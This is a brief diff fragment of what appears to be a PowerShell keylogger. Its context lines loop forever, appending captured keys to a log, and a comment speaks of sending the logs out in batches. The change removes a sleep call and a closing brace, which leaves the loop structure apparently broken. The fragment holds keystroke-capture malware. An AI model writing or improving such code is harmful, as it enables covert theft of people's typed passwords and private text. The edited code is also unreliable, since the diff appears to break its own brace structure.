@@ -57,9 +57,6 @@ while ($true) {
             $log += "$key "
         }
     }
-    Start-Sleep -Milliseconds 10  # Reduce CPU usage
-}
-
     
     # Send logs in batches to avoid spamming
     if ($log.Length -gt 5) {
